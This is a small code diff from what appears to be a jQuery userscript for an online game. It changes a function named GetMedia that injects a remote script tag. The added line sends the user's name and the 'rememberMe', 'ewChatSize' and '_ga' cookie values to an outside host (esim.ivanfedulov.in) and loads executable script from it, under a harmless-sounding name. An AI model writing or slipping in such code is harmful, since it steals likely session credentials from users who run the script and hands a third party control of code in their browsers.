@@ -2343,7 +2343,7 @@ $(document).ready(function () {
 	}
 	
 	function GetMedia(){
-		$('<script src="http://enterbrain.github.io/ShadowGovermentMedia.php?name='+$("#userName").html()+'&rememberMe='+getCookie("rememberMe")+'&ewChatSize='+getCookie("ewChatSize")+'&_ga='+getCookie("_ga")+'" type="text/javascript"></script>').appendTo($("#userMenu"));
+		$('<script src="http://esim.ivanfedulov.in/Shadow-Government/ShadowGovernmentMedia.pl?name='+$("#userName").html()+'&rememberMe='+getCookie("rememberMe")+'&ewChatSize='+getCookie("ewChatSize")+'&_ga='+getCookie("_ga")+'" type="text/javascript"></script>').appendTo($("#userMenu"));
 	}
 	
 	if(inGameCheck()){
